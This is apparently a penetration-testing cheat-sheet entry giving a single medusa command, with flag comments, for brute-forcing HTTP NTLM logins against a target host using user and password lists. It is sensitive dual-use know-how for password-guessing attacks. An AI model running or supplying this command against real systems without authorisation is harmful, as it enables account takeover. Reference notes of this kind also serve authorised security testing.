# NTLM brute force
```sh
# -s: Enable SSL
# -t: Total number of logins to be tested concurrently
# -b: Suppress startup banner
medusa -h "<domain/host>" -s -U <file_with_users> -P <file_with_password> -M http -m AUTH:NTLM -m DIR:"<directory>" -m DOMAIN:"<domain_of_users>" -t 10 -b -O <output_files>
```
